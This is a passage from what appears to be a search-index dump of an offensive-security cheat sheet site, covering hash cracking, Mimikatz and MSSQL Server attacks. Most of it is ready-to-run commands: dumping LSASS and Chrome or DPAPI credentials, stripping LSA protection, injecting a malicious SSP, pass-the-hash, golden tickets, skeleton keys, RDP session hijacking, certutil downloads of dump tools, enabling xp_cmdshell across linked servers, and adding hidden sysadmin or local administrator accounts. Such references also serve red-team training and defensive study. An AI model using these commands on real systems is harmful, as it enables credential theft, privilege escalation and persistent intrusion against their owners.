--restore\n</code></pre>"},{"location":"cheatsheets/hash-cracking/#rainbow-tables","title":"Rainbow tables","text":"<p>The hash is looked for in a pre-computed table. It is a time-memory trade-off that allows cracking hashes faster, but costing a greater amount of memory than traditional brute-force of dictionary attacks. This attack cannot work if the hashed value is salted (i.e. hashed with an additional random value as prefix/suffix, making the pre-computed table irrelevant)</p>"},{"location":"cheatsheets/hash-cracking/#tips-and-tricks","title":"Tips and Tricks","text":"<ul> <li>Cloud GPU<ul> <li>penglab - Abuse of Google Colab for cracking hashes. \ud83d\udc27</li> <li>google-colab-hashcat - Google colab hash cracking</li> <li>Cloudtopolis - Zero Infrastructure Password Cracking</li> <li>Nephelees - also a NTDS cracking tool abusing Google Colab</li> </ul> </li> <li>Build a rig on premise<ul> <li>Pentester's Portable Cracking Rig - $1000</li> <li>How To Build A Password Cracking Rig - 5000$</li> </ul> </li> <li>Online cracking<ul> <li>Hashes.com</li> <li>hashmob.net: great community with Discord</li> </ul> </li> <li>Use the <code>loopback</code> in combination with rules and dictionary to keep cracking until you don't find new passsword: <code>hashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file</code></li> <li>PACK (Password Analysis and Cracking Kit)<ul> <li>https://github.com/iphelix/pack/blob/master/README</li> <li>Can produce custom hcmask files to use with hashcat, based on statistics and rules applied on an input dataset</li> </ul> </li> <li>Use Deep Learning<ul> <li>brannondorsey/PassGAN</li> </ul> </li> </ul>"},{"location":"cheatsheets/hash-cracking/#online-cracking-resources","title":"Online Cracking Resources","text":"<ul> <li>hashes.com</li> <li>crackstation</li> <li>Hashmob</li> </ul>"},{"location":"cheatsheets/hash-cracking/#references","title":"References","text":"<ul> <li>Cracking - The Hacker Recipes</li> <li>Using Hashcat to Crack Hashes on Azure</li> <li>miloserdov.org hashcat</li> <li>miloserdov.org john</li> <li>DeepPass \u2014 Finding Passwords With Deep Learning - Will Schroeder - Jun 1</li> </ul>"},{"location":"cheatsheets/mimikatz-cheatsheet/","title":"Mimikatz","text":""},{"location":"cheatsheets/mimikatz-cheatsheet/#summary","title":"Summary","text":"<ul> <li>Execute commands</li> <li>Extract passwords</li> <li>LSA Protection Workaround</li> <li>Mini Dump</li> <li>Pass The Hash</li> <li>Golden ticket</li> <li>Skeleton key</li> <li>RDP Session Takeover</li> <li>RDP Passwords</li> <li>Credential Manager &amp; DPAPI</li> <li>Chrome Cookies &amp; Credential</li> <li>Task Scheduled credentials</li> <li>Vault</li> <li>Commands list</li> <li>Powershell version</li> <li>References</li> </ul>"},{"location":"cheatsheets/mimikatz-cheatsheet/#execute-commands","title":"Execute commands","text":"<p>Only one command</p> <pre><code>PS C:\\temp\\mimikatz&gt; .\\mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n</code></pre> <p>Mimikatz console (multiple commands)</p> <pre><code>PS C:\\temp\\mimikatz&gt; .\\mimikatz\nmimikatz # privilege::debug\nmimikatz # log\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::wdigest\n</code></pre>"},{"location":"cheatsheets/mimikatz-cheatsheet/#extract-passwords","title":"Extract passwords","text":"<p>Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.</p> <pre><code>mimikatz_command -f sekurlsa::logonPasswords full\nmimikatz_command -f sekurlsa::wdigest\n\n# to re-enable wdigest in Windows Server 2012+\n# in HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest \n# create a DWORD 'UseLogonCredential' with the value 1.\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1\n</code></pre> <p> To take effect, conditions are required : - Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:   * Adding requires lock   * Removing requires signout - Win10:   * Adding requires signout   * Removing requires signout - Win2016:   * Adding requires lock   * Removing requires reboot</p>"},{"location":"cheatsheets/mimikatz-cheatsheet/#lsa-protection-workaround","title":"LSA Protection Workaround","text":"<ul> <li> <p>LSA as a Protected Process (RunAsPPL)   <pre><code># Check if LSA runs as a protected process by looking if the variable \"RunAsPPL\" is set to 0x1\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n\n# Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe\n# Now lets import the mimidriver.sys to the system\nmimikatz # !+\n\n# Now lets remove the protection flags from lsass.exe process\nmimikatz # !processprotect /process:lsass.exe /remove\n\n# Finally run the logonpasswords function to dump lsass\nmimikatz # privilege::debug    \nmimikatz # token::elevate\nmimikatz # sekurlsa::logonpasswords\n\n# Now lets re-add the protection flags to the lsass.exe process\nmimikatz # !processprotect /process:lsass.exe\n\n# Unload the service created\nmimikatz # !-\n\n\n# https://github.com/itm4n/PPLdump\nPPLdump.exe [-v] [-d] [-f] &lt;PROC_NAME|PROC_ID&gt; &lt;DUMP_FILE&gt;\nPPLdump.exe lsass.exe lsass.dmp\nPPLdump.exe -v 720 out.dmp\n</code></pre></p> </li> <li> <p>LSA is running as virtualized process (LSAISO) by Credential Guard <pre><code># Check if a process called lsaiso.exe exists on the running processes\ntasklist |findstr lsaiso\n\n# Lets inject our own malicious Security Support Provider into memory\n# require mimilib.dll in the same folder\nmimikatz # misc::memssp\n\n# Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\\windows\\system32\\mimilsa.log\n</code></pre></p> </li> </ul>"},{"location":"cheatsheets/mimikatz-cheatsheet/#mini-dump","title":"Mini Dump","text":"<p>Dump the lsass process with <code>procdump</code></p> <p>Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) \"bypasses\" that.</p> <pre><code># HTTP method - using the default way\ncertutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\\Users\\Public\\procdump.exe\nC:\\Users\\Public\\procdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# SMB method - using the pid\nnet use Z: https://live.sysinternals.com\ntasklist /fi \"imagename eq lsass.exe\" # Find lsass's pid\nZ:\\procdump.exe -accepteula -ma $lsass_pid lsass.dmp\n</code></pre> <p>Dump the lsass process with <code>rundll32</code></p> <pre><code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass_pid C:\\temp\\lsass.dmp full\n</code></pre> <p>Use the minidump:</p> <ul> <li>Mimikatz: <code>.\\mimikatz.exe \"sekurlsa::minidump lsass.dmp\"</code> <pre><code>mimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonPasswords\n</code></pre></li> <li>Pypykatz: <code>pypykatz lsa minidump lsass.dmp</code></li> </ul>"},{"location":"cheatsheets/mimikatz-cheatsheet/#pass-the-hash","title":"Pass The Hash","text":"<pre><code>mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell\n</code></pre>"},{"location":"cheatsheets/mimikatz-cheatsheet/#golden-ticket","title":"Golden ticket","text":"<pre><code>.\\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt\n</code></pre> <pre><code>.\\mimikatz \"kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" exit\n</code></pre>"},{"location":"cheatsheets/mimikatz-cheatsheet/#skeleton-key","title":"Skeleton key","text":"<pre><code>privilege::debug\nmisc::skeleton\n# map the share\nnet use p: \\\\WIN-PTELU2U07KG\\admin$ /user:john mimikatz\n# login as someone\nrdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab\n</code></pre>"},{"location":"cheatsheets/mimikatz-cheatsheet/#rdp-session-takeover","title":"RDP Session Takeover","text":"<p>Use <code>ts::multirdp</code> to patch the RDP service to allow more than two users.</p> <ul> <li>Enable privileges   <pre><code>privilege::debug \ntoken::elevate \n</code></pre></li> <li>List RDP sessions   <pre><code>ts::sessions\n</code></pre></li> <li>Hijack session   <pre><code>ts::remote /id:2 \n</code></pre></li> </ul> <p>Run <code>tscon.exe</code> as the SYSTEM user, you can connect to any session without a password.</p> <pre><code># get the Session ID you want to hijack\nquery user\ncreate sesshijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#55\"\nnet start sesshijack\n</code></pre>"},{"location":"cheatsheets/mimikatz-cheatsheet/#rdp-passwords","title":"RDP Passwords","text":"<p>Verify if the service is running: </p> <pre><code>sc queryex termservice\ntasklist /M:rdpcorets.dll\nnetstat -nob | Select-String TermService -Context 1\n</code></pre> <ul> <li>Extract passwords manually   <pre><code>procdump64.exe -ma 988 -accepteula C:\\svchost.dmp\nstrings -el svchost* | grep Password123 -C3\n</code></pre></li> <li>Extract passwords using Mimikatz   <pre><code>privilege::debug\nts::logonpasswords\n</code></pre></li> </ul>"},{"location":"cheatsheets/mimikatz-cheatsheet/#credential-manager-dpapi","title":"Credential Manager &amp; DPAPI","text":"<pre><code># check the folder to find credentials\ndir C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\*\n\n# check the file with mimikatz\n$ mimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0\n\n# find master key\n$ mimikatz !sekurlsa::dpapi\n\n# use master key\n$ mimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b\n</code></pre>"},{"location":"cheatsheets/mimikatz-cheatsheet/#chrome-cookies-credential","title":"Chrome Cookies &amp; Credential","text":"<pre><code># Saved Cookies\ndpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies\" /unprotect\ndpapi::chrome /in:\"C:\\Users\\kbell\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b\n\n# Saved Credential in Chrome\ndpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\n</code></pre>"},{"location":"cheatsheets/mimikatz-cheatsheet/#task-scheduled-credentials","title":"Task Scheduled credentials","text":"<pre><code>mimikatz(commandline) # vault::cred /patch\nTargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / &lt;NULL&gt;\nUserName   : DOMAIN\\user\nComment    : &lt;NULL&gt;\nType       : 2 - domain_password\nPersist    : 2 - local_machine\nFlags      : 00004004\nCredential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nAttributes : 0\n</code></pre>"},{"location":"cheatsheets/mimikatz-cheatsheet/#vault","title":"Vault","text":"<pre><code>vault::cred /in:C:\\Users\\demo\\AppData\\Local\\Microsoft\\Vault\\\"\n</code></pre>"},{"location":"cheatsheets/mimikatz-cheatsheet/#commands-list","title":"Commands list","text":"Command Definition CRYPTO::Certificates list/export certificates CRYPTO::Certificates list/export certificates KERBEROS::Golden create golden/silver/trust tickets KERBEROS::List list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user\u2019s tickets.Similar to functionality of \u201cklist\u201d. KERBEROS::PTT pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust). LSADUMP::DCSync ask a DC to synchronize an object (get password data for account). No need to run code on DC. LSADUMP::LSA Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: \u201c/name:krbtgt\u201d LSADUMP::SAM get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer. LSADUMP::Trust Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest). MISC::AddSid Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016. MISC::MemSSP Inject a malicious Windows SSP to log locally authenticated credentials. MISC::Skeleton Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a \u201cmaster password\u201d (aka Skeleton Keys) as well as their usual password. PRIVILEGE::Debug get debug rights (this or Local System rights is required for many Mimikatz commands). SEKURLSA::Ekeys list Kerberos encryption keys SEKURLSA::Kerberos List Kerberos credentials for all authenticated users (including services and computer account) SEKURLSA::Krbtgt get Domain Kerberos service account (KRBTGT)password data SEKURLSA::LogonPasswords lists all available provider credentials. This usually shows recently logged on user and computer credentials. SEKURLSA::Pth Pass- theHash and Over-Pass-the-Hash SEKURLSA::Tickets Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer\u2019s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users). TOKEN::List list all tokens of the system TOKEN::Elevate impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box TOKEN::Elevate /domainadmin impersonate a token with Domain Admin credentials."},{"location":"cheatsheets/mimikatz-cheatsheet/#powershell-version","title":"Powershell version","text":"<p>Mimikatz in memory (no binary on disk) with :</p> <ul> <li>Invoke-Mimikatz from PowerShellEmpire</li> <li>Invoke-Mimikatz from PowerSploit</li> </ul> <p>More information can be grabbed from the Memory with :</p> <ul> <li>Invoke-Mimikittenz</li> </ul>"},{"location":"cheatsheets/mimikatz-cheatsheet/#references","title":"References","text":"<ul> <li>Unofficial Guide to Mimikatz &amp; Command Reference</li> <li>Skeleton Key</li> <li>Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH</li> <li>Dumping RDP Credentials - MAY 24, 2021</li> </ul>"},{"location":"cheatsheets/miscellaneous-tricks/","title":"Miscellaneous &amp; Tricks","text":"<p>All the tricks that couldn't be classified somewhere else.</p>"},{"location":"cheatsheets/miscellaneous-tricks/#send-a-message-to-another-user","title":"Send a message to another user","text":"<pre><code># Windows\nPS C:\\&gt; msg Swissky /SERVER:CRASHLAB \"Stop rebooting the XXXX service !\"\nPS C:\\&gt; msg * /V /W /SERVER:CRASHLAB \"Hello all !\"\n\n# Linux\n$ wall \"Stop messing with the XXX service !\"\n$ wall -n \"System will go down for 2 hours maintenance at 13:00 PM\"  # \"-n\" only for root\n$ who\n$ write root pts/2  # press Ctrl+D  after typing the message. \n</code></pre>"},{"location":"cheatsheets/miscellaneous-tricks/#crackmapexec-credential-database","title":"CrackMapExec Credential Database","text":"<pre><code>cmedb (default) &gt; workspace create test\ncmedb (test) &gt; workspace default\ncmedb (test) &gt; proto smb\ncmedb (test)(smb) &gt; creds\ncmedb (test)(smb) &gt; export creds csv /tmp/creds\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/","title":"MSSQL Server","text":""},{"location":"cheatsheets/mssql-server-cheatsheet/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Identify Instances and Databases<ul> <li>Discover Local SQL Server Instances</li> <li>Discover Domain SQL Server Instances</li> <li>Discover Remote SQL Server Instances</li> <li>Identify Encrypted databases </li> <li>Version Query</li> </ul> </li> <li>Identify Sensitive Information<ul> <li>Get Tables from a Specific Database</li> <li>Gather 5 Entries from Each Column</li> <li>Gather 5 Entries from a Specific Table</li> <li>Dump common information from server to files</li> </ul> </li> <li>Linked Database<ul> <li>Find Trusted Link</li> <li>Execute Query Through The Link</li> <li>Crawl Links for Instances in the Domain </li> <li>Crawl Links for a Specific Instance</li> <li>Query Version of Linked Database</li> <li>Execute Procedure on Linked Database</li> <li>Determine Names of Linked Databases </li> <li>Determine All the Tables Names from a Selected Linked Database</li> <li>Gather the Top 5 Columns from a Selected Linked Table</li> <li>Gather Entries from a Selected Linked Column</li> </ul> </li> <li>Command Execution via xp_cmdshell</li> <li>Extended Stored Procedure<ul> <li>Add the extended stored procedure and list extended stored procedures</li> </ul> </li> <li>CLR Assemblies<ul> <li>Execute commands using CLR assembly</li> <li>Manually creating a CLR DLL and importing it</li> </ul> </li> <li>OLE Automation<ul> <li>Execute commands using OLE automation procedures</li> </ul> </li> <li>Agent Jobs<ul> <li>Execute commands through SQL Agent Job service</li> <li>List All Jobs</li> </ul> </li> <li>External Scripts<ul> <li>Python</li> <li>R</li> </ul> </li> <li>Audit Checks<ul> <li>Find and exploit impersonation opportunities </li> </ul> </li> <li>Find databases that have been configured as trustworthy</li> <li>Manual SQL Server Queries<ul> <li>Query Current User &amp; determine if the user is a sysadmin</li> <li>Current Role</li> <li>Current DB</li> <li>List all tables</li> <li>List all databases</li> <li>All Logins on Server</li> <li>All Database Users for a Database </li> <li>List All Sysadmins</li> <li>List All Database Roles</li> <li>Effective Permissions from the Server</li> <li>Effective Permissions from the Database</li> <li>Find SQL Server Logins Which can be Impersonated for the Current Database</li> <li>Exploiting Impersonation</li> <li>Exploiting Nested Impersonation</li> <li>MSSQL Accounts and Hashes</li> </ul> </li> <li>References</li> </ul>"},{"location":"cheatsheets/mssql-server-cheatsheet/#tools","title":"Tools","text":"<ul> <li>NetSPI/PowerUpSQL - A PowerShell Toolkit for Attacking SQL Server</li> <li>skahwah/SQLRecon - A C# MS SQL toolkit designed for offensive reconnaissance and post-exploitation.</li> </ul>"},{"location":"cheatsheets/mssql-server-cheatsheet/#identify-instances-and-databases","title":"Identify Instances and Databases","text":""},{"location":"cheatsheets/mssql-server-cheatsheet/#discover-local-sql-server-instances","title":"Discover Local SQL Server Instances","text":"<pre><code>Get-SQLInstanceLocal\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#discover-domain-sql-server-instances","title":"Discover Domain SQL Server Instances","text":"<pre><code>Get-SQLInstanceDomain -Verbose\n# Get Server Info for Found Instances\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n# Get Database Names\nGet-SQLInstanceDomain | Get-SQLDatabase -NoDefaults\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#discover-remote-sql-server-instances","title":"Discover Remote SQL Server Instances","text":"<pre><code>Get-SQLInstanceBroadcast -Verbose\nGet-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#identify-encrypted-databases","title":"Identify Encrypted databases","text":"<p>Note: These are automatically decrypted for admins</p> <pre><code>Get-SQLDatabase -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Verbose | Where-Object {$_.is_encrypted -eq \"True\"}\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#version-query","title":"Version Query","text":"<pre><code>Get-SQLInstanceDomain | Get-Query \"select @@version\"\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#identify-sensitive-information","title":"Identify Sensitive Information","text":""},{"location":"cheatsheets/mssql-server-cheatsheet/#get-tables-from-a-specific-database","title":"Get Tables from a Specific Database","text":"<pre><code>Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults\nGet Column Details from a Table\nGet-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt;\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#gather-5-entries-from-each-column","title":"Gather 5 Entries from Each Column","text":"<pre><code>Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords \"&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;\" -Verbose -SampleSize 5\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#gather-5-entries-from-a-specific-table","title":"Gather 5 Entries from a Specific Table","text":"<pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query 'select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;'\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#dump-common-information-from-server-to-files","title":"Dump common information from server to files","text":"<pre><code>Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\\Instance1 -csv\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#linked-database","title":"Linked Database","text":""},{"location":"cheatsheets/mssql-server-cheatsheet/#find-trusted-link","title":"Find Trusted Link","text":"<pre><code>select * from master..sysservers\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#execute-query-through-the-link","title":"Execute Query Through The Link","text":"<pre><code>-- execute query through the link\nselect * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')\nselect version from openquery(\"linkedserver\", 'select @@version as version');\n\n-- chain multiple openquery\nselect version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')\n\n-- execute shell commands\nEXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\nselect 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')\n\n-- create user and give admin privileges\nEXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\nEXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#crawl-links-for-instances-in-the-domain","title":"Crawl Links for Instances in the Domain","text":"<p>A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results</p> <pre><code>Get-SQLInstanceDomain | Get-SQLServerLink -Verbose\nselect * from master..sysservers\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#crawl-links-for-a-specific-instance","title":"Crawl Links for a Specific Instance","text":"<pre><code>Get-SQLServerLinkCrawl -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Verbose\nselect * from openquery(\"&lt;instance&gt;\",'select * from openquery(\"&lt;instance2&gt;\",''select * from master..sysservers'')')\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#query-version-of-linked-database","title":"Query Version of Linked Database","text":"<pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DBSERVERNAME\\DBInstance&gt;`\",'select @@version')\" -Verbose\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#execute-procedure-on-linked-database","title":"Execute Procedure on Linked Database","text":"<pre><code>SQL&gt; EXECUTE('EXEC sp_configure ''show advanced options'',1') at \"linked.database.local\";\nSQL&gt; EXECUTE('RECONFIGURE') at \"linked.database.local\";\nSQL&gt; EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at \"linked.database.local\";\nSQL&gt; EXECUTE('RECONFIGURE') at \"linked.database.local\";\nSQL&gt; EXECUTE('exec xp_cmdshell whoami') at \"linked.database.local\";\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#determine-names-of-linked-databases","title":"Determine Names of Linked Databases","text":"<p>tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.</p> <pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\",'select name from sys.databases')\" -Verbose\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#determine-all-the-tables-names-from-a-selected-linked-database","title":"Determine All the Tables Names from a Selected Linked Database","text":"<p>The result is TableName which feeds into following query</p> <pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\",'select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables')\" -Verbose\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#gather-the-top-5-columns-from-a-selected-linked-table","title":"Gather the Top 5 Columns from a Selected Linked Table","text":"<p>The results are ColumnName and ColumnValue which feed into following query</p> <pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\",'select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;')\" -Verbose\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#gather-entries-from-a-selected-linked-column","title":"Gather Entries from a Selected Linked Column","text":"<pre><code>Get-SQLQuery -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"select * from openquery(`\"&lt;DatabaseLinkName&gt;`\"'select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;')\" -Verbose\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#command-execution-via-xp_cmdshell","title":"Command Execution via xp_cmdshell","text":"<p>xp_cmdshell disabled by default since SQL Server 2005</p> <pre><code>PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command whoami\n\n# Creates and adds local user backup to the local administrators group:\nPowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"net user backup Password1234 /add'\" -Verbose\nPowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"net localgroup administrators backup /add\" -Verbose\n</code></pre> <ul> <li>Manually execute the SQL query     <pre><code>EXEC xp_cmdshell \"net user\";\nEXEC master..xp_cmdshell 'whoami'\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\nEXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';\n</code></pre></li> <li>If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)     <pre><code>EXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\n</code></pre></li> <li>If the procedure was uninstalled     <pre><code>sp_addextendedproc 'xp_cmdshell','xplog70.dll'\n</code></pre></li> </ul>"},{"location":"cheatsheets/mssql-server-cheatsheet/#extended-stored-procedure","title":"Extended Stored Procedure","text":""},{"location":"cheatsheets/mssql-server-cheatsheet/#add-the-extended-stored-procedure-and-list-extended-stored-procedures","title":"Add the extended stored procedure and list extended stored procedures","text":"<pre><code># Create evil DLL\nCreate-SQLFileXpDll -OutFile C:\\temp\\test.dll -Command \"echo test &gt; c:\\temp\\test.txt\" -ExportName xp_test\n\n# Load the DLL and call xp_test\nGet-SQLQuery -UserName sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"sp_addextendedproc 'xp_test', '\\\\10.10.0.1\\temp\\test.dll'\"\nGet-SQLQuery -UserName sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Query \"EXEC xp_test\"\n\n# Listing existing\nGet-SQLStoredProcedureXP -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Verbose\n</code></pre> <ul> <li>Build a DLL using xp_evil_template.cpp</li> <li>Load the DLL     <pre><code>-- can also be loaded from UNC path or Webdav\nsp_addextendedproc 'xp_calc', 'C:\\mydll\\xp_calc.dll'\nEXEC xp_calc\nsp_dropextendedproc 'xp_calc'\n</code></pre></li> </ul>"},{"location":"cheatsheets/mssql-server-cheatsheet/#clr-assemblies","title":"CLR Assemblies","text":"<p>Prerequisites: * sysadmin privileges * CREATE ASSEMBLY permission (or) * ALTER ASSEMBLY permission (or)</p> <p>The execution takes place with privileges of the service account.</p>"},{"location":"cheatsheets/mssql-server-cheatsheet/#execute-commands-using-clr-assembly","title":"Execute commands using CLR assembly","text":"<pre><code># Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string\nCreate-SQLFileCLRDll -ProcedureName \"runcmd\" -OutFile runcmd -OutDir C:\\Users\\user\\Desktop\n\n# Execute command using CLR assembly\nInvoke-SQLOSCmdCLR -Username sa -Password &lt;password&gt; -Instance &lt;instance&gt; -Command \"whoami\" -Verbose\nInvoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"whoami\" Verbose\nInvoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"&lt;DBSERVERNAME\\DBInstance&gt;\" -Command \"powershell -e &lt;base64&gt;\" -Verbose\n\n# List all the stored procedures added using CLR\nGet-SQLStoredProcedureCLR -Instance &lt;instance&gt; -Verbose\n</code></pre>"},{"location":"cheatsheets/mssql-server-cheatsheet/#manually-creating-a-clr-dll-and-importing-it","title":"Manually creating a CLR DLL and importing it","text":"<p>Create a C# DLL file with the following content, with the command : <code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library c:\\temp\\cmd_exec.cs</code></p> <pre><code>using System;\nusing 